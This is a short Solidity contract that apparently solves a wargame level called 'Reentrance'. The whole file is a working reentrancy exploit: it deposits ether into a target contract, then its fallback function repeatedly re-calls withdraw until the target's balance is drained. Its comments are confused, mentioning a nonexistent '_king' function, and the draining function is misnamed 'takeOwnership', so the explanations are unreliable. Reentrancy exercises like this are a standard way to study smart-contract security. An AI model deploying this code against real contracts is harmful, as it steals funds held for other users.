// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

interface Reentrance {
    function donate(address _to) external payable;
     function balanceOf(address _who) external view returns (uint balance);
      function withdraw(uint _amount) external;
}


contract Break {
    event Response(bool success, bytes data);

    address public _vulnerableContract;
    constructor( address _contractAddress) {
        _vulnerableContract = address(_contractAddress);
    }

function sendEther() public payable {
    require(msg.value>0,"value should be greater than 0");

    Reentrance(_vulnerableContract).donate{value:msg.value}(address(this));
}
function takeOwnership() public payable {

uint balance = Reentrance(_vulnerableContract).balanceOf(address(this));
Reentrance(_vulnerableContract).withdraw(balance);

}
    //It will send you ether
    // you will be calling that function again when that function sends you ether
    // you will call a fallback function which calls that _king fucntion again. with some extra ether
    fallback()external payable {
if(address(_vulnerableContract).balance>0)
{
Reentrance(_vulnerableContract).withdraw(0.001 ether);
}


    }
}